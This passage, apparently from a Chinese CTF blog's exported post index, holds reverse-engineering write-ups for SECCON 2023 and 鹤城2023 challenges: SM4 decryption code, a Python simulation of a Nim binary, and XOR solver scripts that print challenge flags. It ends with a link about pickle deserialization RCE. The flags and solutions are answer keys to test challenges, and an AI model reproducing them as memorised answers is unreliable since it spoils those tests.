void sm4_crypt_cbc(sm4_context *ctx, int mode, int length, unsigned char iv[16],
    unsigned char *input, unsigned char *output) &#123;
    int i;
    unsigned char temp[16];
    if (mode == SM4_ENCRYPT) &#123;
        while (length &gt; 0) &#123;
            for (i = 0; i &lt; 16; i++)
                output[i] = (unsigned char)(input[i] ^ iv[i]);
            sm4_one_round(ctx-&gt;sk, output, output);
            memcpy(iv, output, 16);
            input += 16;
            output += 16;
            length -= 16;
        &#125;
    &#125; else /* SM4_DECRYPT */
    &#123;
        while (length &gt; 0) &#123;
            memcpy(temp, input, 16);
            sm4_one_round(ctx-&gt;sk, input, output);
            for (i = 0; i &lt; 16; i++)
                output[i] = (unsigned char)(output[i] ^ iv[i]);
            memcpy(iv, temp, 16);
            input += 16;
            output += 16;
            length -= 16;
        &#125;
    &#125;
&#125;
int main() &#123;
    unsigned char key[17] = &quot;SECCON CTF 2023!&quot;;
    unsigned char input[112] = &#123;
        0xFE, 0x60, 0xA8, 0xC0, 0x3B, 0xFE, 0xBC, 0x66, 0xFC, 0x9A, 0x9B, 0x31,
        0x9A, 0xD8, 0x03, 0xBB, 0xA9, 0xE1, 0x56, 0xFC, 0xFC, 0x11, 0x9F, 0x89,
        0x5F, 0x4D, 0x9F, 0xE0, 0x9F, 0xAE, 0x2A, 0xCF, 0x5E, 0x73, 0xCB, 0xEC,
        0x3F, 0xFF, 0xB9, 0xD1, 0x99, 0x44, 0x1B, 0x9A, 0x79, 0x79, 0xEC, 0xD1,
        0xB4, 0xFD, 0xEA, 0x2B, 0xE2, 0xF1, 0x1A, 0x70, 0x76, 0x3C, 0x2E, 0x7F,
        0x3F, 0x3B, 0x7B, 0x66, 0xA3, 0x4B, 0x1B, 0x5C, 0x0F, 0xBE, 0xDD, 0x98,
        0x5A, 0x5B, 0xD0, 0x0A, 0x3D, 0x7E, 0x2C, 0x10, 0x56, 0x2A, 0x10, 0x87,
        0x5D, 0xD9, 0xB9, 0x7F, 0x3E, 0x2E, 0x86, 0xB7, 0x17, 0x04, 0xDF, 0xB1,
        0x27, 0xC4, 0x47, 0xE2, 0xD9, 0x7A, 0x9A, 0x48, 0x7C, 0xDB, 0xC6, 0x1D,
        0x3C, 0x00, 0xA3, 0x21&#125;;
    unsigned char output[112];
    sm4_context ctx;
    unsigned long i;
    // sm4_setkey_enc(&amp;ctx, key);
    // sm4_crypt_ecb(&amp;ctx, 1, 64, input, output);
    // for (i = 0; i &lt; 64; i++)
    // printf(&quot;%02x &quot;, output[i]);
    // printf(&quot;\n&quot;);
    sm4_setkey_dec(&amp;ctx, key);
    sm4_crypt_ecb(&amp;ctx, 0, 112, input, output);
    for (i = 0; i &lt; 112; i++)
        printf(&quot;%c&quot;, output[i]);
    printf(&quot;\n&quot;);
    return 0;
&#125;
</code></pre>
<h4 id="optinimize"><a href="#optinimize" class="headerlink" title="optinimize"></a>optinimize</h4><p>第一次见的nim编译产物，抽象是有点抽象的，尤其这个符号表（有点当年第一次见rust的美感）</p>
<p>主动态来看，发现它输出flag的几位后就卡住了，本来想着是不是要考模拟执行，然后发现应该就是手动把整个流程复现出来，让他跑就完了</p>
<p>调一下发现主要就是在<code>Q_main</code>里面的<code>P_main</code>卡住的</p>
<p>然后不会了，只得看wp…..555555555555…..</p>
<p>这是模拟的代码，一样是跑不出来的（注意dump的时候都是QWORD格式，可以自己处理一下）</p>
<pre><code class="python">def P(i: int):
    num1 = 3
    num2 = 0
    num3 = 2
    num4 = 0
    if i == num4:
        return num1
    else:
        num5 = 1
        if i == num5:
            return num2
        else:
            num6 = 2
            if i == num6:
                return num3
            else:
                num7 = 2
                if num7 &lt; i:
                    j = i
                    num8 = 2
                    while num8 &lt; j:
                        v98 = num1 + num2
                        num1 = num2
                        num2 = num3
                        num3 = v98
                        j -= 1
                    return num3


def Q(n: int):
    i = num = 0
    while i &lt; n:
        num += 1
        v63 = P(num) % num
        if v63 == 0:
            i += 1
    return num

ns = [0x000000000000004A, 0x0000000000000055, 0x000000000000006F, 0x0000000000000079, 0x0000000000000080, 0x0000000000000095, 0x00000000000000AE, 0x00000000000000BF, 0x00000000000000C7, 0x00000000000000D5, 0x0000000000000306, 0x0000000000001AC8, 0x00000000000024BA, 0x0000000000003D00, 0x0000000000004301, 0x0000000000005626, 0x0000000000006AD9, 0x0000000000007103, 0x000000000000901B, 0x0000000000009E03, 0x00000000001E5FB6, 0x000000000026F764, 0x000000000030BD9E, 0x0000000000407678, 0x00000000005B173B, 0x00000000006FE3B1, 0x000000000078EF25, 0x0000000000858E5F, 0x000000000098C639, 0x0000000000AD6AF6, 0x0000000001080096, 0x00000000018E08CD, 0x0000000001BB6107, 0x0000000001F50FF1, 0x00000000025C6327, 0x0000000002A971B6, 0x0000000002D68493, 0x000000000362F0C0, 0x0000000003788EAD, 0x0000000003CAA8ED]

cs = [0x3C,0xF4,0x1A,0xD0,0x8A,0x17,0x7C,0x4C,0xDF,0x21,0xDF,0xB0,0x12,0xB8,0x4E,0xFA,0xD9,0x2D,0x66,0xFA,0xD4,0x95,0xF0,0x66,0x6D,0xCE,0x69,0x00,0x7D,0x95,0xEA,0xD9,0x0A,0xEB,0x27,0x63,0x75,0x11,0x37,0xD4,0x00,0x00,0x00,0x00,0x00,0x00,0x00]

for i in range(len(cs)):
    print(chr((Q(ns[i]) &amp; 0xff) ^ cs[i]), end=&#39;&#39;)
</code></pre>
<p>唉然后是优化，oi题来了……没太看懂，贴个wp吧…（r3大哥确实太高手了）</p>
<p><img src="/2023/09/18/seccon-2023/image-20230919171428466.png" alt="image-20230919171428466"></p>
]]></content>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>鹤城2023</title>
    <url>/2023/09/18/%E9%B9%A4%E5%9F%8E2023/</url>
    <content><![CDATA[<h6 id="PREFACE-没啥好说的，队友带飞"><a href="#PREFACE-没啥好说的，队友带飞" class="headerlink" title="PREFACE: 没啥好说的，队友带飞"></a>PREFACE: 没啥好说的，队友带飞</h6><span id="more"></span>

<h4 id="CrackMe"><a href="#CrackMe" class="headerlink" title="CrackMe"></a>CrackMe</h4><p>C#，逻辑简单的，多余的部分只是隐藏回显用</p>
<p><img src="/2023/09/18/%E9%B9%A4%E5%9F%8E2023/image-20230918134205880.png" alt="image-20230918134205880"></p>
<pre><code class="python">enc = [123,148,62,53,24,116,244,126,63,90]
from Crypto.Cipher import DES
import string
import itertools
import base64
charset = string.ascii_letters + string.digits + string.punctuation + &quot;&quot;
for j in enc:
    # charset = string.ascii_letters + string.digits + string.punctuation
    for i in range(255):
        b = i &amp; 7
        b2 = i &gt;&gt; 3 &amp; 255
        a = b &lt;&lt; 5 | b2
        a ^= 18
        if (a == j):
            print(chr(i),end=&quot;&quot;)

# flag&#123;K4a9P37ciB&#125; （这里格式忘了，但是里面是对的）
</code></pre>
<h4 id="List"><a href="#List" class="headerlink" title="List"></a>List</h4><p><img src="/2023/09/18/%E9%B9%A4%E5%9F%8E2023/image-20230918134342093.png" alt="image-20230918134342093"></p>
<p>一个简单的异或</p>
<pre><code class="python">enc = [  0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0x12,
  0x13, 0x14, 0x15, 0x21, 0x22, 0x23, 0x24, 0x25, 0x31, 0x32,
  0x33, 0x34, 0x35, 0x41, 0x42, 0x43, 0x44, 0x45, 0x51, 0x52,
  0x53, 0x54, 0x55, 0x12, 0x13, 0x11, 0x14, 0x15]

h = [    0x68, 0x27, 0x21, 0x21, 0x70, 0x64, 0x61, 0x32, 0x64, 0x34,
  0x7D, 0x72, 0x73, 0x73, 0x73, 0x51, 0x51, 0x0A, 0x05, 0x07,
  0x40, 0x46, 0x46, 0x46, 0x19, 0x77, 0x25, 0x25, 0x74, 0xFA,
  0xEB, 0x16, 0x53, 0x2E, 0x23, 0x52, 0x4E, 0x77, 0xCD]

flag = &#39;&#39;
for i in range(38):
  flag += chr(enc[len(enc) - 1 - i] ^ h[i])
print(flag[::-1])

# flag&#123;5accf61b8debe679ed21068e6a51b203&#125;
</code></pre>
]]></content>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>pickle反序列化</title>
    <url>/2023/09/18/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h6 id="PREFACE-就是看看"><a href="#PREFACE-就是看看" class="headerlink" title="PREFACE: 就是看看~"></a>PREFACE: 就是看看~</h6><span id="more"></span>

<p><a href="https://zhuanlan.zhihu.com/p/89132768">从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势 - 知乎 (zhihu.com)</a></p>
]]></content>
  </entry>
</search>
